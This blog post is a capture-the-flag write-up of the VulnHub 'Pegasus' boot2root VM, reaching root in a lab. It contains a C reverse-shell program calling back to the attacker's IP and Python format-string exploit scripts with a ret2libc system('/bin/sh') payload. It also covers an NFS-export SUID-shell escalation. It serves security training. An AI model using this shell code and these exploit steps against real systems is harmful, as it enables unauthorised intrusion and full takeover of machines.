---
layout: post
title: "Pegasus hacking challenge"
date: 2015-01-04 01:17:05 -0500
comments: true
categories: boot2root
---

Happy 2015! With the holidays and merry making out of the way, it was time to resume hacking boot2roots and CTFs. To start off the new year is Pegasus, by [TheKnapsy](https://twitter.com/TheKnapsy). I actually started this challenge a week before Christmas, but after getting a foothold on the target, I put it on hold to prepare for the holidays and unplug for a few days. Today I finally got around to loading it up again and finishing it off. I recommend having a go at it, so grab it from [VulnHub](https://www.vulnhub.com/entry/pegasus-1,109/). 

<!--more--> 

As usual I started off with a port scan to identify any interesting services. A full TCP and UDP scan with onetwopunch.sh returned the following results: 

```
# scanreport.sh -f s.txt 

Host: 192.168.180.130 ()    
22  open    tcp     ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)    
111 open    tcp     rpcbind     2-4 (RPC #100000)   
8088    open    tcp     http        nginx 1.1.19    
57957   open    tcp     status      1 (RPC #100024)     OS: Linux 3.11 - 3.14   Seq Index: 260  IP ID Seq: All zeros

Host: 192.168.180.130 ()    
111 open    udp     rpcbind 
```

nginx was running on port 8088, so I decided to start with that. I fired up a web browser and navigated to this IP and port to find an image of Pegasus. Using wfuzz, I was able to identify two php files: submit.php and codereview.php. 

```
# wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.180.130:8088/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.180.130:8088/FUZZ.php
Payload type: file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

Total requests: 220560
==================================================================
ID  Response   Lines      Word         Chars          Request    
==================================================================

00184:  C=200      0 L         4 W       19 Ch    " - submit"
56927:  C=000      7 L        12 W      173 Ch    " - Paris Hilton"
89234:  C=200     14 L        58 W      488 Ch    " - codereview"
112484:  C=000      7 L       12 W      173 Ch    " - Crypt Hunter
.
.
.
```

submit.php didn't provide any interesting information, but codereview.php showed a text area where I could input code for review. 

![](/images/2015-01-04/01.png)

I initially started out by trying PHP code to execute reverse shells, but nothing appeared to work. If the submitted entry contained the a call to system(), it returned an error stating that code containing the system() function wouldn't be reviewed. It occurred to me that perhaps it was C code that was being reviewed, and not PHP. I tried the following C code which would give me a reverse shell on port 443: 

```c
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("192.168.180.129");
    sa.sin_port = htons(443);

    s = socket(AF_INET, SOCK_STREAM, 0); 
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0; 
}
```

I setup a listener on port 443, submitted the code, and got a shell on the target as user mike. 

```
# nc -lvp 443
listening on [any] 443 ...
192.168.180.130: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.180.129] from (UNKNOWN) [192.168.180.130] 44881
id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
```

To make things easier, I copied over my SSH key into mike's .ssh/authorized_keys file and logged in via SSH. 

I found a binary called my_first in mike's home directory that was SUID john. This seemed to be the next logical step in privilege escalation. Running my_first presented an interactive menu: 

```text
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
```

Option 1 was the most interesting. It would prompt for two numbers and return their sum. With some basic fuzzing, I found that it was vulnerable to a format string bug when the second number wasn't a number: 

```
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 1

Enter first number: 123
Enter second number: AAAABBBB.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Error details: AAAABBBB.bfe390dc.a.4005e160.401d0ac0.40020ff4.40021918.bfe390e0.41414141.42424242.2e78252e.252e7825

Selection: 
```

My format string was showing up as the 8th and 9th parameter. Time to inspect it with gdb. gdb was installed on the target, so I transferred peda over and had a look at what was going on. The format string bug occurs in the calculator() function at offset 191

```
   0x080486b6 <+155>:   call   0x8048410 <strtol@plt>
   0x080486bb <+160>:   mov    DWORD PTR [ebp-0x10],eax
   0x080486be <+163>:   mov    eax,DWORD PTR [ebp-0x7c]
   0x080486c1 <+166>:   movzx  eax,BYTE PTR [eax]
   0x080486c4 <+169>:   cmp    al,0xa
   0x080486c6 <+171>:   je     0x80486f2 <calculator+215>
   0x080486c8 <+173>:   mov    DWORD PTR [esp],0x8048961
   0x080486cf <+180>:   call   0x80483b0 <printf@plt>
   0x080486d4 <+185>:   mov    eax,DWORD PTR [ebp-0x7c]
   0x080486d7 <+188>:   mov    DWORD PTR [esp],eax
=> 0x080486da <+191>:   call   0x80483b0 <printf@plt>
   0x080486df <+196>:   mov    DWORD PTR [esp],0xa
   0x080486e6 <+203>:   call   0x8048400 <putchar@plt>

```

This execution branch is only taken if the second number isn't a number. Breaking at this location after entering the format string shows that it's being used as the argument to printf():

```
[-------------------------------------code-------------------------------------]
   0x80486cf <calculator+180>:  call   0x80483b0 <printf@plt>
   0x80486d4 <calculator+185>:  mov    eax,DWORD PTR [ebp-0x7c]
   0x80486d7 <calculator+188>:  mov    DWORD PTR [esp],eax
=> 0x80486da <calculator+191>:  call   0x80483b0 <printf@plt>
   0x80486df <calculator+196>:  mov    DWORD PTR [esp],0xa
   0x80486e6 <calculator+203>:  call   0x8048400 <putchar@plt>
   0x80486eb <calculator+208>:  mov    eax,0x1
   0x80486f0 <calculator+213>:  jmp    0x8048749 <calculator+302>
Guessed arguments:
arg[0]: 0xbff88eb0 ("AAAABBBB.%8$x\n")
[------------------------------------stack-------------------------------------]
0000| 0xbff88e90 --> 0xbff88eb0 ("AAAABBBB.%8$x\n")
0004| 0xbff88e94 --> 0xbff88eac --> 0xbff88eb0 ("AAAABBBB.%8$x\n")
0008| 0xbff88e98 --> 0xa ('\n')
0012| 0xbff88e9c --> 0x4005e160 (add    ebx,0x171e94)
0016| 0xbff88ea0 --> 0x401d0ac0 --> 0xfbad2288 
0020| 0xbff88ea4 --> 0x40020ff4 --> 0x20f1c 
0024| 0xbff88ea8 --> 0x40021918 --> 0x0 
0028| 0xbff88eac --> 0xbff88eb0 ("AAAABBBB.%8$x\n")
[------------------------------------------------------------------------------]
```

With a format string bug, the most likely case of exploitation would be to use it to overwrite the GOT entry of a function so that when said function is later called, it would execute whatever instructions I had pointed it to. Based on the above information, putchar() was the next function called, so I decided to overwrite its address with some junk and see what the stack looked like. 

First, I had to get putchar()'s GOT entry. Easily done with objdump:

```
mike@pegasus:~$ objdump -R my_first | grep putchar
08049c10 R_386_JUMP_SLOT   putchar
```

Next I wrote up a python script called sploit.py to print out the format string into a text file that I could redirect into gdb:

```python
#!/usr/bin/env python

import struct

buf =  "1\n"            # calculator option
buf += "10\n"           # first number

# format string payload starts here
buf += "\x10\x9c\x04\x08"
buf += "\x12\x9c\x04\x08"

buf += "%1c%8$hn"       
buf += "%1c%9$hn"       

# junk so we can see where we are on the stack
buf += "AAAABBBBCCCCDDDDEEEEFFFF"

print buf
```

Back to gdb, I setup the text file containing the format string and set a breakpoint at offset 203 in the calculator function which is the call to putchar(). Finally, I passed the format string to the binary to see what would happen: 

```text
gdb-peda$ shell ./sploit.py > in.txt
gdb-peda$ r < in.txt 
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ���
AAAABBBBCCCCDDDDEEEEFFFF

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x23 ('#')
EBX: 0xb77acff4 --> 0x1a5d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbf951728 --> 0xbf951758 --> 0x0 
ESP: 0xbf95168c --> 0x80486eb (<calculator+208>:    mov    eax,0x1)
EIP: 0xa0009 ('\t')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0xa0009
[------------------------------------stack-------------------------------------]
0000| 0xbf95168c --> 0x80486eb (<calculator+208>:   mov    eax,0x1)
0004| 0xbf951690 --> 0xa ('\n')
0008| 0xbf951694 --> 0xbf9516ac --> 0xbf9516b0 --> 0x8049c10 --> 0xa0009 ('\t')
0012| 0xbf951698 --> 0xa ('\n')
0016| 0xbf95169c --> 0xb763b160 (add    ebx,0x171e94)
0020| 0xbf9516a0 --> 0xb77adac0 --> 0xfbad2088 
0024| 0xbf9516a4 --> 0xb77d9ff4 --> 0x20f1c 
0028| 0xbf9516a8 --> 0xb77da918 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000a0009 in ?? ()

```

EIP was set to an invalid address 0x000a0009. That meant I'd overwritten putchar()'s GOT entry with the value 0x000a0009. At the time of the crash, the stack looked like this:

```
gdb-peda$ context stack 25
--More--(25/25)
[------------------------------------stack-------------------------------------]
0000| 0xbf95168c --> 0x80486eb (<calculator+208>:   mov    eax,0x1)
0004| 0xbf951690 --> 0xa ('\n')
0008| 0xbf951694 --> 0xbf9516ac --> 0xbf9516b0 --> 0x8049c10 --> 0xa0009 ('\t')
0012| 0xbf951698 --> 0xa ('\n')
0016| 0xbf95169c --> 0xb763b160 (add    ebx,0x171e94)
0020| 0xbf9516a0 --> 0xb77adac0 --> 0xfbad2088 
0024| 0xbf9516a4 --> 0xb77d9ff4 --> 0x20f1c 
0028| 0xbf9516a8 --> 0xb77da918 --> 0x0 
0032| 0xbf9516ac --> 0xbf9516b0 --> 0x8049c10 --> 0xa0009 ('\t')
0036| 0xbf9516b0 --> 0x8049c10 --> 0xa0009 ('\t')
0040| 0xbf9516b4 --> 0x8049c12 --> 0xaf20000a 
0044| 0xbf9516b8 ("%1c%8$hn%1c%9$hnAAAABBBBCCCCDDDDEEEEFFFF\n")
0048| 0xbf9516bc ("8$hn%1c%9$hnAAAABBBBCCCCDDDDEEEEFFFF\n")
0052| 0xbf9516c0 ("%1c%9$hnAAAABBBBCCCCDDDDEEEEFFFF\n")
0056| 0xbf9516c4 ("9$hnAAAABBBBCCCCDDDDEEEEFFFF\n")
0060| 0xbf9516c8 ("AAAABBBBCCCCDDDDEEEEFFFF\n")
0064| 0xbf9516cc ("BBBBCCCCDDDDEEEEFFFF\n")
0068| 0xbf9516d0 ("CCCCDDDDEEEEFFFF\n")
0072| 0xbf9516d4 ("DDDDEEEEFFFF\n")
0076| 0xbf9516d8 ("EEEEFFFF\n")
0080| 0xbf9516dc ("FFFF\n")
0084| 0xbf9516e0 --> 0x3031000a ('\n')
0088| 0xbf9516e4 --> 0x804000a 
0092| 0xbf9516e8 --> 0x4 
0096| 0xbf9516ec --> 0xb77acff4 --> 0x1a5d7c 
[------------------------------------------------------------------------------]
```

My payload "AAABBBBCCCCDDDDEEEEFFFF" was 60 bytes up from ESP. I decided to fake a call to system("/bin/sh") using the payload. I needed a gadget that would clear the stack of the junk and return to system(). NX was enabled on the binary so the stack wasn't executable, but since I wasn't executing shellcode on the stack that wasn't a problem.. ASLR was enabled on the target, but since it was a 32-bit Linux system, I could disable randomization of function addresses using:

```
ulimit -s unlimited
```

Great, next was to find the address of system() and "/bin/sh" on the target: 

```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x40069060 <system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x4018bb78 ("/bin/sh")
```

I took note of those addresses. Next was to find a gadget that would clear the stack of 60 bytes. The binary itself was rather small and I couldn't find a gadget that satisfied my requirements. However, since I already had access to the server itself, why not pull down its libc and search that for gadgets? So I transferred /lib/i386-linux-gnu/libc-2.15.so over to my machine and after going over it with ROPeMe, I settled on the following gem:

```
0x19e06L: add esp 0x44 ;;
```

I just had to add this to the base address of libc, which was obtained with peda: 

```
gdb-peda$ vmmap 
Start      End        Perm  Name
.
.
.
0x4002a000 0x401ce000 r-xp  /lib/i386-linux-gnu/libc-2.15.so
.
.
.
```

The result was 0x40043e06. A quick double check to make sure that everything was right: 

```
gdb-peda$ x/5i 0x40043e06
   0x40043e06 <__moddi3+134>:   add    esp,0x44
   0x40043e09 <__moddi3+137>:   ret    
   0x40043e0a <__moddi3+138>:   lea    esi,[esi+0x0]
   0x40043e10 <__moddi3+144>:   mov    ecx,DWORD PTR [esp+0x1c]
   0x40043e14 <__moddi3+148>:   neg    esi
```

Perfect. I now needed to modify sploit.py so that it would write the that address to putchar()'s GOT entry. After a bit of math and tweaking, I ended up with the following: 

```python
#!/usr/bin/env python

import struct

buf =  "1\n"        # calculator option
buf += "10\n"       # first number

# format string payload starts here
buf += "\x10\x9c\x04\x08"
buf += "\x12\x9c\x04\x08"

# this sets putchar() to 0x40043e06 (add esp,0x44; ret) which pivots
# us to an area we control on the stack
buf += "%15870c%8$hn"
buf += "%510c%9$hn"

# we return to the stack at the call to system()
buf += "AA"                             # removed by add esp,0x44
buf += struct.pack("<I", 0x40069060)    # system()
buf += struct.pack("<I", 0xfeedface)    # fake retaddr for system()
buf += struct.pack("<I", 0x4018bb78)    # /bin/sh

print buf
```

I ran it again in gdb and it worked:

```text
gdb-peda$ r < in.txt
.
.
.
AA`�@����x�@
[New process 29256]
process 29256 is executing new program: /bin/dash
[New process 29257]
process 29257 is executing new program: /bin/dash
[Inferior 3 (process 29257) exited normally]
Warning: not running or target is remote
```

Time to get that shell: 

```
mike@pegasus:~$ whoami
mike
mike@pegasus:~$ (cat ./in.txt ; cat) | ./my_first 
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ��   
.
.
.
AA`�@����x�@
whoami
john
```

Great, I got a shell as user john! I copied my SSH key over to john's .ssh/authorized_keys file and logged in via SSH. I checked john's sudo rights and found that he could run /usr/local/sbin/nfs without a password: 

```
john@pegasus:~$ sudo -l
Matching Defaults entries for john on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs
```

I went ahead and exected /usr/local/sbin/nfs to see what it did. 

```
john@pegasus:~$ sudo /usr/local/sbin/nfs
Usage: nfs [start|stop]
john@pegasus:~$ sudo /usr/local/sbin/nfs start
 * Exporting directories for NFS kernel daemon...                                                                       [ OK ] 
 * Starting NFS kernel daemon                                                                                           [ OK ] 
john@pegasus:~$
```

It seemed like it was simply starting up the NFS daemon. A quick check showed that nfsd was running and TCP port 2049 was now open. On my attacking machine, I checked for any mountable filesystems on the target: 

```
# showmount -e 192.168.180.130
Export list for 192.168.180.130:
/opt/nfs *
```

/opt/nfs was available. I went ahead and mounted it to /mnt/pegasus

```
# mkdir /mnt/pegasus
# mount -t nfs -o nolock 192.168.180.130:/opt/nfs /mnt/pegasus/
```

What I discovered was that any file I created in /mnt/pegasus on my machine, would be created on the target's /opt/nfs directory with root permissions. So I simply copied over /bin/sh and set it to SUID root permissions in /mnt/pegasus: 

```
# cp /bin/sh /mnt/pegasus
# chmod 4755 /mnt/pegasus/sh
```

A quick check on the target showed the /opt/nfs/sh was SUID root: 

```
john@pegasus:~$ ls -l /opt/nfs
total 96
-rwsr-xr-x 1 root root 97284 Dec 20 19:14 sh
-rw-r--r-- 1 root root     0 Dec 20 19:12 testing
```

All that was left was to execute /opt/nfs/sh: 

```
john@pegasus:~$ whoami
john
john@pegasus:~$ /opt/nfs/sh
# whoami
root
```

Victory! This challenge comes with a flag in /root, so I had a look at it:

```
# cat /root/flag
               ,
               |`\        
              /'_/_   
            ,'_/\_/\_                       ,   
          ,'_/\'_\_,/_                    ,'| 
        ,'_/\_'_ \_ \_/                _,-'_/
      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
    ,' /_\ _'_ \_ \'_,/       __,-'<_,' _,\_,/      known creatures in Greek
   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
    \_`\> 6` 7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
      \_'/>   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
        >/  _ ,V  ,<  \__ '\,_'_ \_ \'_,/
      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
     ( ) \_ \|_  `\_    \_,/'\,_'_,/'               a video game system sold in
      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
       \_)   >        `\_                           It was a hardware clone of
            /  `,      |`\_                         the Nintendo Famicom.
           /    \     / \ `\
          /   __/|   /  /  `\  
         (`  (   (` (_  \   /   
         /  ,/    |  /  /   \   
        / ,/      | /   \   `\_ 
      _/_/        |/    /__/,_/
     /_(         /_( 


CONGRATULATIONS! You made it :)

Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)

Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.

Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!

Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
```

What a great way to start of the New Year! Thanks to TheKnapsy and VulnHub for making the challenge available! 
